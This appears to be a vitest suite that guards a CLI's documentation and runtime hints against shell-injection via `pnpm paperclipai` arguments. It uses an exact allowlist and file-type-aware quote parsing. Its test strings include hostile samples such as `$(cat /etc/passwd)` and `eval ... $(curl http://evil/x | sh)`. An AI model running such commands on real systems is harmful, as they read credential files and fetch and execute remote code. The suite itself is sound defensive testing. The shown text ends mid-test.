import { readdirSync, readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { generateReadme } from "../services/company-export-readme.js";

// The Paperclip CLI is unsafe when an operator or an agent runs it through
// `pnpm paperclipai <sub> <arg>` with a content-bearing argument. `pnpm` treats
// `paperclipai` as a `package.json` script. It appends the argument to a
// double-quoted `/bin/sh` command string, so the shell reads the argument first
// and runs command substitution (a backtick pair or `$( )`) and variable
// expansion (`$NAME`) before the CLI starts. `npx paperclipai` runs the CLI
// binary directly. It passes the argument as an inert argv value and does not
// run a shell over the value. `npx paperclipai` is the safe form.
//
// `pnpm exec paperclipai` is not a safe substitute. The root workspace does not
// depend on the `paperclipai` package, so `pnpm` never links its binary into
// `node_modules/.bin`. The command fails with `Command "paperclipai" not found`,
// even after a build. The guard bans it from the guidance surfaces.
//
// This guard is fail-closed against an exact allowlist. A `pnpm paperclipai`
// line is allowed only when its full command string matches an exact entry in
// `PNPM_ALLOWLIST`. Each allowlist entry is a fully literal local lifecycle or
// setup command. A fully literal command carries no substitutable value: no
// placeholder, no example value the reader replaces, no interpolation, no path,
// no ref, no id, and no name. It holds the subcommand and, at most, flags that
// take no value. Every other `pnpm paperclipai` line is an offender and must use
// `npx paperclipai` (or the direct-exec form for local source).

const here = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(here, "../../..");

function read(relPath: string): string {
  return readFileSync(path.join(repoRoot, relPath), "utf8");
}

// Return the `### Offline and air-gapped use` subsection of `doc/CLI.md`. The
// subsection runs from its own heading to the next Markdown heading. The scan
// reads only this text, so a `pnpm` mention in another section does not affect
// the offline-guidance assertions.
function extractOfflineSubsection(cli: string): string {
  const marker = "### Offline and air-gapped use";
  const start = cli.indexOf(marker);
  if (start < 0) return "";
  const rest = cli.slice(start + marker.length);
  const nextHeading = rest.search(/\n#{1,3} /);
  return marker + (nextHeading < 0 ? rest : rest.slice(0, nextHeading));
}

// ── The exact allowlist ───────────────────────────────────────────────────
//
// Each entry is a fully literal command string. A `pnpm paperclipai` line is
// allowed only when its extracted command string equals one of these entries.
// Add a new entry only for a command that carries no substitutable value.

const PNPM_ALLOWLIST = new Set<string>([
  "pnpm paperclipai --help",
  "pnpm paperclipai run",
  "pnpm paperclipai onboard",
  "pnpm paperclipai onboard --yes",
  "pnpm paperclipai onboard --run",
  "pnpm paperclipai onboard --yes --run",
  "pnpm paperclipai doctor",
  "pnpm paperclipai doctor --repair",
  "pnpm paperclipai auth bootstrap-ceo",
  "pnpm paperclipai connect",
  "pnpm paperclipai migrate",
  "pnpm paperclipai db:backup",
  "pnpm paperclipai configure --section server",
  "pnpm paperclipai configure --section secrets",
  "pnpm paperclipai configure --section storage",
  "pnpm paperclipai configure --section database",
  "pnpm paperclipai env",
  "pnpm paperclipai env-lab up",
  "pnpm paperclipai env-lab doctor",
  "pnpm paperclipai env-lab status --json",
  "pnpm paperclipai env-lab down",
  "pnpm paperclipai context show",
  "pnpm paperclipai context list",
  "pnpm paperclipai issue list",
  "pnpm paperclipai dashboard get",
  "pnpm paperclipai plugin list",
  "pnpm paperclipai feedback report",
  "pnpm paperclipai feedback report --payloads",
  "pnpm paperclipai feedback export",
  "pnpm paperclipai instance settings:experimental",
  "pnpm paperclipai worktree ensure-seeded",
  "pnpm paperclipai worktree repair",
  "pnpm paperclipai worktree env",
  "pnpm paperclipai worktree env --json",
]);

// ── Documentation phrases ─────────────────────────────────────────────────
//
// A policy or warning sentence names `pnpm paperclipai` on purpose to tell the
// reader not to use it, or to describe the abstract command form. These phrases
// are not runnable commands, so they are exempt. The set is narrow and exact: a
// mixed safe/unsafe example does not match, because its command string carries a
// real subcommand and arguments.

const DOC_PHRASES = new Set<string>([
  // A bare mention such as `` `pnpm paperclipai` `` inside prose.
  "pnpm paperclipai",
  // The abstract command form the policy section discusses.
  "pnpm paperclipai <command> <args>",
]);

// ── Command extraction ────────────────────────────────────────────────────
//
// Extract the full logical command that a reader runs from a `pnpm paperclipai`
// occurrence. The guard compares the whole runnable command against the
// allowlist, never a prefix. A quote, a backtick, or a parenthesis is a shell
// metacharacter, not a safe extraction boundary. The guard must not truncate
// the command at one of them and then match the shorter prefix. If it did, a
// line such as `pnpm paperclipai run "$(cat secret)"` would truncate to the
// allowlisted `pnpm paperclipai run` and pass, while the copied command still
// runs the shell substitution.
//
// The guard trusts a string span only inside a proven literal context. The
// context depends on the file type, so the guard reads the scanned file path
// (`relPath`). A quote means a different thing in each language, so the guard
// must not trust the same span shape everywhere.
//  - Shell (`.sh`): never trust a quote or a backtick span. A shell concatenates
//    a quoted string with the text next to it, so a close quote is not a safe
//    boundary. The guard extracts to the logical line end and lets the allowlist
//    reject any tail that is not a proven terminator.
//  - Markdown (`.md`, `.mdx`): trust a backtick inline-code span only. A backtick
//    opens a real literal span. A double quote in Markdown is plain prose, not a
//    literal delimiter, so the guard does not trust a double-quote span.
//  - Source (`.ts`, `.tsx`, `.js`, `.jsx`): trust a quote span only when it is
//    the complete value of a `command:` property. The guard proves this shape by
//    two facts. First, a `command` key and a colon sit directly before the open
//    delimiter. Second, a source-string terminator (one of `,` `;` `)` `]` `}`,
//    after optional whitespace) follows the close delimiter. A bare comma is not
//    enough. An array element or a call argument also ends at a comma, and a
//    later `join` or a call concatenates it with an untrusted tail. The shape
//    `["pnpm paperclipai run", tail].join("")` extracts the allowlisted prefix
//    but the runtime value carries the tail. The guard trusts only the direct
//    `command:` property, so it fails closed on every other comma-terminated span.
//  - Any other file type: never trust a span, and fail closed.
//
// The guard trusts a span only when its opener is adjacent to the marker: the
// delimiter, then optional whitespace or a `$ ` shell prompt, then `pnpm`. When
// the guard trusts the span, the next matching delimiter closes it, and the
// command is the text from the marker to that close.
//
// Outside a proven literal context the guard fails closed. It extracts the
// command to the logical line end, or to a ` #` comment. A backtick, a quote, or
// a parenthesis here is a shell metacharacter, so it stays in the extracted
// command. The command then fails the allowlist match and the guard reports it.
// This is the key rule: a quote or a backtick that follows the command is never
// a truncation boundary, so a line such as `pnpm paperclipai run "$(cat secret)"`
// keeps its dangerous suffix and the guard rejects it.
//
// The guard never infers a safe enclosing span from an arbitrary unmatched
// delimiter earlier on the line. An earlier `"` or backtick that is not adjacent
// to the marker is ambiguous context, so the guard fails closed. An escaped
// delimiter (`\"` or an escaped backtick) is literal text, so it never opens or
// closes a span.
//
// The scan collapses internal whitespace, so a backslash-continued command
// compares as one normalized string.

function normalizeCommand(raw: string): string {
  return raw.replace(/\s+/g, " ").trim();
}

// Return true when the delimiter at index `index` in `text` is escaped. A
// delimiter is escaped when an odd number of backslashes sit directly before it.
function isEscaped(text: string, index: number): boolean {
  let backslashes = 0;
  for (let i = index - 1; i >= 0 && text[i] === "\\"; i -= 1) {
    backslashes += 1;
  }
  return backslashes % 2 === 1;
}

// Return the span delimiter that opens the command, or null when no delimiter is
// adjacent to the marker. The guard trusts a span only when its opener sits
// directly next to the marker. The opener is the last character of `before`
// after the removal of an optional trailing gap: whitespace and, at most, one
// `$ ` shell prompt. An earlier unmatched delimiter that is not adjacent is
// ambiguous context, so this function returns null and the caller fails closed.
// An escaped delimiter (`\"` or an escaped backtick) is literal text, so it does
// not open a span.
const ADJACENCY_GAP = /(?:[ \t]*(?:\$[ \t]+)?)$/;

function adjacentSpanOpener(before: string): string | null {
  const head = before.replace(ADJACENCY_GAP, "");
  const last = head.length - 1;
  if (last < 0) return null;
  const char = head[last];
  if (char !== "`" && char !== '"') return null;
  if (isEscaped(head, last)) return null;
  return char;
}

// Return the index of the next unescaped `delimiter` in `tail`, or -1 when the
// span has no close. An escaped delimiter is literal text, so it does not close
// the span.
function nextUnescapedDelimiter(tail: string, delimiter: string): number {
  for (let i = 0; i < tail.length; i += 1) {
    if (tail[i] === delimiter && !isEscaped(tail, i)) return i;
  }
  return -1;
}

// Classify the scanned file by its extension. The trusted-span rule depends on
// the file type, because a quote means a different thing in each language.
type FileKind = "shell" | "markdown" | "source" | "other";

function fileKind(relPath: string): FileKind {
  const ext = path.extname(relPath).toLowerCase();
  if (ext === ".sh") return "shell";
  if (ext === ".md" || ext === ".mdx") return "markdown";
  if (ext === ".ts" || ext === ".tsx" || ext === ".js" || ext === ".jsx") {
    return "source";
  }
  return "other";
}

// A source string literal ends at a real terminator: a comma, a semicolon, or a
// close bracket, after optional whitespace. A close delimiter that a shell
// expansion (for example `$(`) or a string concatenation follows is not a proven
// literal end.
const SOURCE_TERMINATOR = /^[ \t]*[,;)\]}]/;

// A complete static command literal has the shape `command: <literal>`. A
// `command` key and a colon sit directly before the open delimiter. This proves
// the literal is the whole property value. An array element or a call argument
// has a different context before the open delimiter (a `[`, a `(`, or a comma),
// so it never matches. The `(?:^|[^\w$])` guard stops a longer key such as
// `subcommand` from matching the `command` tail.
const COMMAND_PROPERTY_OPENER = /(?:^|[^\w$])command\s*:\s*$/;

// Return the text directly before the open delimiter. The open delimiter is the
// last character of `before` after the removal of the adjacency gap.
function textBeforeOpener(before: string): string {
  const head = before.replace(ADJACENCY_GAP, "");
  return head.slice(0, -1);
}

// Return true when a trusted span opens the command in a proven literal context.
// The context depends on the file type. The guard fails closed on every other
// context, so it never infers a safe span outside a proven literal.
function spanIsProvenLiteral(
  relPath: string,
  open: string,
  before: string,
  tail: string,
  close: number,
): boolean {
  const kind = fileKind(relPath);
  if (kind === "shell" || kind === "other") return false;
  // A Markdown backtick opens an inline-code span. A Markdown double quote is
  // plain prose, so the guard does not trust it.
  if (kind === "markdown") return open === "`";
  // A source string literal (a double quote or a template backtick) is a proven
  // literal only when it is the complete value of a `command:` property. Two
  // facts must hold. The `command:` key sits directly before the open delimiter,
  // and a source terminator follows the close delimiter. A bare comma alone is
  // not enough, because an array element or a call argument also ends at a comma
  // and a later concatenation joins it with an untrusted tail.
  if (!SOURCE_TERMINATOR.test(tail.slice(close + 1))) return false;
  return COMMAND_PROPERTY_OPENER.test(textBeforeOpener(before));
}

function extractCommand(relPath: string, text: string, at: number): string {
  const before = text.slice(0, at);
  const tail = text.slice(at);
  const open = adjacentSpanOpener(before);
  if (open !== null) {
    // The marker sits inside a span whose opener is adjacent to the marker. The
    // guard trusts the matching close delimiter as a real terminator only inside
    // a proven literal context for this file type.
    const close = nextUnescapedDelimiter(tail, open);
    if (close >= 0 && spanIsProvenLiteral(relPath, open, before, tail, close)) {
      return normalizeCommand(tail.slice(0, close));
    }
  }
  // Fail closed. Outside a proven literal context the command runs to a ` #`
  // comment or the line end. A quote, a backtick, or a parenthesis stays inside
  // the extracted command, so a dangerous suffix fails the allowlist match.
  const comment = tail.search(/\s#/);
  const raw = comment < 0 ? tail : tail.slice(0, comment);
  return normalizeCommand(raw);
}

// A `pnpm paperclipai` occurrence is an offender when it is wrapped in a
// command-substitution span, or when its full command string is neither an
// allowlist entry nor a documentation phrase. The command-substitution check
// catches `$(pnpm paperclipai ...)`, which normalizes the dangerous habit of
// running the CLI inside a shell substitution even when the inner command is
// literal.

function findOffenders(relPath: string, text: string): string[] {
  const offenders: string[] = [];
  const marker = "pnpm paperclipai";
  let from = 0;
  for (;;) {
    const at = text.indexOf(marker, from);
    if (at < 0) break;
    from = at + marker.length;
    const before = text.slice(0, at);
    const wrapped = /\$\(\s*$/.test(before);
    const command = extractCommand(relPath, text, at);
    if (wrapped) {
      offenders.push(command);
      continue;
    }
    if (PNPM_ALLOWLIST.has(command)) continue;
    if (DOC_PHRASES.has(command)) continue;
    offenders.push(command);
  }
  return offenders;
}

// ── Repository walk ───────────────────────────────────────────────────────
//
// The scan covers guidance the reader follows now: documentation, skills, and
// the runtime source that emits CLI instructions. It skips historical records
// and internal automation, because a reader does not copy a command from them:
// `doc/logs` holds past verification logs, `doc/plans` holds dated design
// plans, and `scripts` holds trusted automation with fixed arguments. It skips
// test files, because a test names the unsafe form to assert against it.

const SKIP_DIRS = new Set([
  "node_modules",
  ".git",
  "dist",
  "build",
  ".next",
  "coverage",
  ".paperclip",
  "tmp",
]);

const SKIP_PATH_PREFIXES = ["doc/logs/", "doc/plans/", "scripts/"];

const SCAN_EXTENSIONS = new Set([
  ".md",
  ".mdx",
  ".ts",
  ".tsx",
  ".js",
  ".jsx",
  ".sh",
  ".json",
]);

function isTestFile(relPath: string): boolean {
  return (
    relPath.includes("__tests__/") ||
    /\.(test|spec)\.[tj]sx?$/.test(relPath)
  );
}

function listGuidanceFiles(): string[] {
  const found: string[] = [];

  function walk(absDir: string, relDir: string): void {
    for (const entry of readdirSync(absDir, { withFileTypes: true })) {
      if (entry.isSymbolicLink()) continue;
      const relPath = relDir ? `${relDir}/${entry.name}` : entry.name;
      if (entry.isDirectory()) {
        if (SKIP_DIRS.has(entry.name)) continue;
        walk(path.join(absDir, entry.name), relPath);
        continue;
      }
      if (!SCAN_EXTENSIONS.has(path.extname(entry.name))) continue;
      if (isTestFile(relPath)) continue;
      if (SKIP_PATH_PREFIXES.some((prefix) => relPath.startsWith(prefix))) continue;
      found.push(relPath);
    }
  }

  walk(repoRoot, "");
  return found;
}

// ── Backslash line continuation ───────────────────────────────────────────
//
// A shell reads a backslash at the end of a line as a line join. So one
// command can spread its content-bearing arguments across many physical
// lines. The scan must see the whole command, not one physical line. If it
// checks each physical line alone, a `pnpm paperclipai` command whose unsafe
// argument sits on a later line passes undetected.
//
// `toLogicalLines` joins each backslash-continued physical line to the next
// one. It returns the joined text and the line number of the first physical
// line, so an offender report still points to the start of the command.

interface LogicalLine {
  text: string;
  lineNumber: number;
}

function toLogicalLines(source: string): LogicalLine[] {
  const physicalLines = source.split("\n");
  const logicalLines: LogicalLine[] = [];
  let buffer: string | null = null;
  let startLine = 0;
  physicalLines.forEach((physicalLine, index) => {
    const continues = /\\\s*$/.test(physicalLine);
    const body = physicalLine.replace(/\\\s*$/, "");
    if (buffer === null) {
      startLine = index + 1;
      buffer = body;
    } else {
      buffer += body;
    }
    if (!continues) {
      logicalLines.push({ text: buffer, lineNumber: startLine });
      buffer = null;
    }
  });
  if (buffer !== null) {
    logicalLines.push({ text: buffer, lineNumber: startLine });
  }
  return logicalLines;
}

function scanText(relPath: string, source: string): string[] {
  const offenders: string[] = [];
  for (const { text, lineNumber } of toLogicalLines(source)) {
    for (const command of findOffenders(relPath, text)) {
      offenders.push(`${relPath}:${lineNumber}: ${command}`);
    }
  }
  return offenders;
}

function scanForOffenders(): string[] {
  const offenders: string[] = [];
  for (const relPath of listGuidanceFiles()) {
    offenders.push(...scanText(relPath, read(relPath)));
  }
  return offenders;
}

// A line that recommends the broken `pnpm exec paperclipai` form. A warning line
// names the broken form on purpose to tell the reader not to use it. Skip such a
// line, so the note itself does not trip the ban.
function recommendsBrokenExecForm(line: string): boolean {
  if (!line.includes("pnpm exec paperclipai")) return false;
  const lower = line.toLowerCase();
  const warns =
    lower.includes("broken") ||
    lower.includes("not found") ||
    lower.includes("do not use");
  return !warns;
}

function scanForBrokenExecForm(): string[] {
  const offenders: string[] = [];
  for (const relPath of listGuidanceFiles()) {
    read(relPath)
      .split("\n")
      .forEach((line, index) => {
        if (recommendsBrokenExecForm(line)) {
          offenders.push(`${relPath}:${index + 1}: ${line.trim()}`);
        }
      });
  }
  return offenders;
}

describe("paperclipai CLI invocation safety", () => {
  it("allows only exact-allowlist pnpm paperclipai commands on every guidance surface", () => {
    const offenders = scanForOffenders();
    expect(
      offenders,
      `Each pnpm paperclipai line must match an exact allowlist entry, else use ` +
        `npx paperclipai (or the direct-exec form for local source):\n${offenders.join("\n")}`,
    ).toEqual([]);
  });

  it("never recommends the broken pnpm exec paperclipai form", () => {
    const offenders = scanForBrokenExecForm();
    expect(
      offenders,
      `\`pnpm exec paperclipai\` does not resolve the CLI binary; use \`npx paperclipai\`:\n${offenders.join("\n")}`,
    ).toEqual([]);
  });

  // ── The extraction and allowlist logic, in isolation ─────────────────────
  //
  // Each case fails before this change and passes after it. Before, the guard
  // recognized only a limited flag set and skipped any line that mentioned
  // `npx paperclipai`. So it missed `--config`, `--data-dir`, `--instance`,
  // `--bind`, a context-profile value, and worktree path/ref/id/name options,
  // and a mixed safe/unsafe line hid behind its `npx` mention.

  it("flags a value-bearing option that the old flag list omitted", () => {
    // --config, --data-dir, --instance, and --bind each carry a value.
    expect(scanText("doc/E.md", "pnpm paperclipai doctor --config ./scratch.json")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm paperclipai run --data-dir ./tmp/dev")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm paperclipai run --instance dev")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm paperclipai run --bind tailnet")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm paperclipai onboard --yes --bind lan")).toHaveLength(1);
  });

  it("flags a context-profile value and every worktree path/ref/id/name option", () => {
    expect(scanText("doc/E.md", "pnpm paperclipai context use default")).toHaveLength(1);
    // Path, ref, id, and name options on worktree commands.
    expect(scanText("doc/E.md", "pnpm paperclipai worktree repair --branch PAP-1-x")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm paperclipai worktree:make my-feature --start-point origin/main")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm paperclipai worktree init --from-config ~/.paperclip/config.json")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm paperclipai worktree reseed --to PAP-1-x")).toHaveLength(1);
  });

  it("does not let an npx mention on the same line suppress detection", () => {
    // A mixed line names the safe form but still shows the unsafe command.
    const mixed = "Prefer npx paperclipai, but pnpm paperclipai issue create --title x also works.";
    expect(scanText("doc/E.md", mixed)).toHaveLength(1);
  });

  it("rejects a command-substitution or variable span in a recommended command", () => {
    // Backtick command substitution, $( ) command substitution, and $NAME
    // variable expansion each reach a shell before the CLI starts.
    expect(scanText("doc/E.md", "pnpm paperclipai allowed-hostname `hostname`")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm paperclipai issue create --title $(cat /etc/passwd)")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm paperclipai run --instance $INSTANCE")).toHaveLength(1);
    // A literal command wrapped in $( ) is still an offender.
    expect(scanText("doc/E.md", 'eval "$(pnpm paperclipai worktree env)"')).toHaveLength(1);
  });

  it("flags an allowlisted prefix followed by a quoted or backtick suffix", () => {
    // The full runnable command is not the allowlisted prefix. The guard must
    // match the whole command, not the prefix truncated at the quote or the
    // backtick. A reader who copies the line runs the shell-expanded suffix.
    // (a) A double-quoted value that carries shell-expanded content.
    expect(scanText("doc/E.md", 'pnpm paperclipai run "$(cat /etc/passwd)"')).toHaveLength(1);
    expect(scanText("doc/E.md", 'pnpm paperclipai doctor "$HOME/scratch.json"')).toHaveLength(1);
    // (b) A backtick-delimited suffix after the allowlisted command.
    expect(scanText("doc/E.md", "pnpm paperclipai run `hostname`")).toHaveLength(1);
    // A single-quoted suffix is also part of the full command.
    expect(scanText("doc/E.md", "pnpm paperclipai onboard 'extra value'")).toHaveLength(1);
  });

  // ── Fail closed on an ambiguous quote context before the marker ──────────
  //
  // The round-4 guard toggled a span open on every unmatched delimiter earlier
  // on the logical line. So an arbitrary leading `"` or backtick before the
  // marker opened a false span, and the first delimiter in the tail closed it.
  // The extraction then dropped the dangerous suffix and matched the allowlisted
  // prefix. That is fail-open. The guard now trusts a span only when its opener
  // is adjacent to the marker. A non-adjacent earlier delimiter is ambiguous, so
  // the guard extracts to the logical line end and keeps the dangerous suffix.
  //
  // Each case below extracts the full command that includes the suffix, so each
  // reports exactly one offender. On the round-4 code each accepted case
  // extracted only `pnpm paperclipai run` (or `... doctor`) and reported zero
  // offenders. The comment on each case marks that fail-open delta.

  it("fails closed on a leading unmatched double quote before the marker", () => {
    // Round-4: the leading `"` opened a span; the tail `"` closed it; the guard
    // extracted `pnpm paperclipai run` and reported zero offenders (fail open).
    const line = 'some prose with one " quote then pnpm paperclipai run "$(dangerous)"';
    expect(scanText("doc/E.md", line)).toHaveLength(1);
    // The same shape with a doctor prefix and a `$VAR` suffix.
    const varLine = 'a stray " quote and pnpm paperclipai doctor "$HOME/x"';
    expect(scanText("doc/E.md", varLine)).toHaveLength(1);
  });

  it("fails closed on a leading unmatched backtick and on mixed delimiters", () => {
    // Round-4: the leading backtick opened a span; the tail backtick closed it;
    // the guard extracted `pnpm paperclipai run` and reported zero offenders.
    const backtick = "a stray ` tick then pnpm paperclipai run `hostname`";
    expect(scanText("doc/E.md", backtick)).toHaveLength(1);
    // Mixed: a leading unmatched backtick, then a double-quoted `$( )` suffix.
    const mixedA = 'a stray ` tick then pnpm paperclipai run "$(cat secret)"';
    expect(scanText("doc/E.md", mixedA)).toHaveLength(1);
    // Mixed: a leading unmatched double quote, then a backtick suffix.
    const mixedB = 'a stray " quote then pnpm paperclipai run `hostname`';
    expect(scanText("doc/E.md", mixedB)).toHaveLength(1);
  });

  it("does not let an escaped delimiter before the marker open a span", () => {
    // An escaped quote is literal text, not a span opener. Round-4 counted the
    // `"` in `\"` as a real delimiter, opened a span, and could fail open. The
    // guard ignores an escaped delimiter, so it extracts the full command.
    const escapedQuote = 'a label \\" then pnpm paperclipai run "$(dangerous)"';
    expect(scanText("doc/E.md", escapedQuote)).toHaveLength(1);
    const escapedTick = "a label \\` then pnpm paperclipai run `hostname`";
    expect(scanText("doc/E.md", escapedTick)).toHaveLength(1);
    // An escaped delimiter directly before the marker is not an adjacent opener,
    // so the guard fails closed and keeps the dangerous suffix.
    const adjacentEscaped = '\\"pnpm paperclipai run "$(dangerous)"';
    expect(scanText("doc/E.md", adjacentEscaped)).toHaveLength(1);
  });

  it("still trusts a span in its proven literal context", () => {
    // A Markdown inline-code backtick span and a source string literal both place
    // the opener directly before the marker in a proven literal context, so the
    // guard reads the full command inside the span and matches the allowlist. An
    // optional `$ ` prompt inside the span still counts as adjacent. The source
    // double-quote span is proven only by the terminator that follows its close.
    expect(scanText("doc/E.md", "Run `pnpm paperclipai run` to start.")).toEqual([]);
    expect(scanText("config/example.ts", '  command: "pnpm paperclipai onboard --yes --run",')).toEqual([]);
    expect(scanText("doc/E.md", "Run `$ pnpm paperclipai doctor` to check.")).toEqual([]);
  });

  // ── Fail closed outside a proven literal context (context-aware spans) ────
  //
  // The round-5 guard trusted an adjacent quote span in every file type. So an
  // unescaped double quote directly before the marker opened a span, and the next
  // double quote closed it. The guard then extracted only the truncated prefix
  // and matched the allowlist, while the text outside the close quote still
  // reached a shell. The shape `eval "<allowlisted form>"$(untrusted)` passed
  // with zero offenders. The guard now trusts a span only in a proven literal
  // context for the file type, so each shape below reports one offender.

  it("fails closed on a shell eval that concatenates a quoted form with a substitution", () => {
    // A shell concatenates the quoted string with the `$( )` result, so the close
    // quote is not a safe boundary. The `.sh` rule never trusts a quote span, so
    // the guard keeps the dangerous suffix and reports the whole command.
    const shell = 'eval "pnpm paperclipai run"$(curl http://evil/x | sh)';
    expect(scanText("deploy/run.sh", shell)).toHaveLength(1);
  });

  it("fails closed on a quoted residual in a Markdown line", () => {
    // A Markdown double quote is prose, not a literal delimiter. The guard does
    // not trust the span, so the dangerous suffix outside the quote stays in the
    // command and the guard reports it.
    const md = 'Run "pnpm paperclipai run"$(cat /etc/passwd) to start.';
    expect(scanText("doc/E.md", md)).toHaveLength(1);
  });

  it("fails closed on a TypeScript quote span that a concatenation or a substitution follows", () => {
    // A source double quote is a literal only when a source terminator follows
    // its close. A close quote that a `+` concatenation or a `$(` expansion
    // follows is not a proven literal end, so the guard reports the command.
    const concat = 'const cmd = "pnpm paperclipai run" + userInput;';
    expect(scanText("src/build-cmd.ts", concat)).toHaveLength(1);
    const substitution = 'const cmd = "pnpm paperclipai run"$(inject);';
    expect(scanText("src/build-cmd.ts", substitution)).toHaveLength(1);
  });

  it("still accepts the legitimate source literals in the Playwright configs", () => {
    // A backtick template literal and a double-quote string literal each end at a
    // real source terminator (a comma), so the source-terminator rule proves the
    // literal context and the allowlist matches. These two real files must pass.
    expect(scanText("tests/e2e/playwright.config.ts", read("tests/e2e/playwright.config.ts"))).toEqual([]);
    expect(
      scanText(
        "tests/perf/issue-detail/playwright.config.ts",
        read("tests/perf/issue-detail/playwright.config.ts"),
      ),
    ).toEqual([]);
  });

  // ── Fail closed on a comma-terminated fragment that a join concatenates ───
  //
  // The round-6 guard trusted any source quote span whose close delimiter a comma
  // follows. A comma is a source terminator, but it does not prove the literal is
  // the complete emitted command. An array element and a call argument both end
  // at a comma, and a later `join` or a call concatenates the element with an
  // untrusted tail. The guard now trusts a comma only for a direct `command:`
  // property, so each composition below reports one offender.

  it("fails closed on an allowlisted prefix joined with a tail in an array literal", () => {
    // The literal is one array element, not the whole command. `join("")`
    // concatenates it with `userControlledTail`, so the runtime value carries the
    // tail. The comma after the element is a source terminator, but it does not
    // prove a complete command, so the guard reports the whole expression.
    const source =
      'const command = ["pnpm paperclipai run", userControlledTail].join("");';
    const offenders = scanText("src/build-command.ts", source);
    expect(offenders).toHaveLength(1);
  });

  it("fails closed on an allowlisted prefix passed as a call argument with a tail", () => {
    // A function-call argument list joins an allowlisted prefix literal with a
    // tail. The comma after the prefix is a call-argument separator, not a proof
    // of a complete command, so the guard reports the composition.
    const source = 'const command = buildCommand("pnpm paperclipai run", tail);';
    const offenders = scanText("src/build-command.ts", source);
    expect(offenders).toHaveLength(1);
  });

  it("flags an allowlisted prefix with a backtick suffix on a continued line", () => {
    // The parser joins backslash-continued lines into one logical command. An
    // allowlisted first line does not make the whole command safe. The suffix on
    // the continued line still reaches a shell.
    const quoted = ["pnpm paperclipai doctor \\", '  --config "$(cat secret)"'].join("\n");
    expect(scanText("doc/EXAMPLE.md", quoted)).toHaveLength(1);
    const backtick = ["pnpm paperclipai run \\", "  `hostname`"].join("\n");
    const offenders = scanText("doc/EXAMPLE.md", backtick);
    expect(offenders).toHaveLength(1);
    expect(offenders[0]).toContain("doc/EXAMPLE.md:1:");
  });

  it("allows an exact allowlist entry and a bare documentation mention", () => {
    expect(scanText("doc/E.md", "pnpm paperclipai run")).toEqual([]);
    expect(scanText("doc/E.md", "pnpm paperclipai worktree env --json")).toEqual([]);
    expect(scanText("doc/E.md", "pnpm paperclipai configure --section server")).toEqual([]);
    // A prose mention inside backticks is not a runnable command.
    expect(scanText("doc/E.md", "Do not use `pnpm paperclipai` for a content-bearing argument.")).toEqual([]);
    expect(scanText("doc/E.md", "The `pnpm paperclipai <command> <args>` form is unsafe.")).toEqual([]);
  });

  // ── Direct assertions on the runtime-generated instruction surfaces ──────

  it("emits a static, non-interpolated safe form from the private-hostname guard messages", () => {
    const source = read("server/src/middleware/private-hostname-guard.ts");
    // The blocked-host and missing-host messages must never interpolate the
    // request Host header into the guidance command. An operator or an agent
    // can paste the guidance into a shell, and that outer shell evaluates a
    // metacharacter span in the host before any CLI receives argv. A direct-exec
    // form does not stop the outer shell. Emit a static `<host>` placeholder only.
    expect(source).toContain("run npx paperclipai allowed-hostname <host>");
    expect(source).not.toContain("allowed-hostname ${hostname}");
    expect(source).not.toContain("pnpm paperclipai allowed-hostname");
    expect(source).not.toContain("pnpm exec paperclipai allowed-hostname");
  });

  it("emits a static, non-interpolated safe form from the onboarding access diagnostics", () => {
    const source = read("server/src/routes/access.ts");
    expect(source).not.toMatch(/pnpm paperclipai allowed-hostname/);
    expect(source).not.toContain("pnpm exec paperclipai allowed-hostname");
    expect(source).toContain("npx paperclipai allowed-hostname <host>");
    // The onboarding host comes from the request base URL, so a requester
    // controls it. The emitted command must carry a static `<host>` placeholder
    // and never interpolate that value.
    expect(source).not.toMatch(/allowed-hostname \$\{/);
  });

  it("emits the safe form from the agent onboarding prompt", () => {
    const source = read("ui/src/lib/agent-onboarding-prompt.ts");
    expect(source).not.toContain("pnpm paperclipai allowed-hostname");
    expect(source).not.toContain("pnpm exec paperclipai allowed-hostname");
    expect(source).toContain("npx paperclipai allowed-hostname <host>");
  });

  it("emits the safe form in the generated company-export README", () => {
    const readme = generateReadme(
      { agents: [], projects: [], skills: [], issues: [] } as never,
      { companyName: "Acme", companyDescription: null },
    );
    expect(readme).toContain("npx paperclipai company import this-github-url-or-folder");
    expect(readme).not.toContain("pnpm paperclipai company import");
    expect(readme).not.toContain("pnpm exec paperclipai company import");
  });

  it("emits the safe form in the company-export preview builder", () => {
    const source = read("ui/src/pages/CompanyExport.tsx");
    expect(source).not.toContain("pnpm paperclipai company import");
    expect(source).not.toContain("pnpm exec paperclipai company import");
    expect(source).toContain("npx paperclipai company import");
  });

  // ── Runtime surfaces and their fixed literal lifecycle hints ─────────────
  //
  // The server startup banner, the UI bootstrap fallback, and the board skill
  // emit the onboard, bootstrap, and board-setup hints. These three surfaces
  // reach readers on the published install, who have no monorepo checkout. The
  // `pnpm paperclipai` script resolves only inside a checkout, so each surface
  // must pin the `npx paperclipai` form. The client connection-error hint also
  // reaches a reader who may run an installed package, so it keeps `npx`. The
  // env-lab cleanup hint runs from a source checkout and must work from any
  // subdirectory, so it uses the module-resolved direct-exec form (see below).

  it("emits the onboard hint from the server startup banner", () => {
    const source = read("server/src/startup-banner.ts");
    expect(source).toContain("npx paperclipai onboard");
    expect(source).not.toContain("pnpm paperclipai onboard");
    expect(source).not.toContain("pnpm exec paperclipai onboard");
  });

  it("emits the safe run form from the client connection-error hint", () => {
    const source = read("cli/src/client/http.ts");
    expect(source).toContain("npx paperclipai run");
    expect(source).not.toContain("pnpm paperclipai run");
  });

  it("emits the checked-out CLI cleanup form from the env-lab status output", () => {
    const source = read("cli/src/commands/env-lab.ts");
    // The env-lab fixture runs from a source checkout. The cleanup hint must run
    // the local `cli/src` through the direct-exec form. That form passes an inert
    // `argv` value, so no shell reads the argument. The hint resolves the paths
    // from the module location, so it works from any subdirectory of the
    // checkout. A `cli/...` path relative to the caller would break outside the
    // repository root. The `cli/src/env-lab.test.ts` suite proves the runtime
    // behaviour; this check pins the source form.
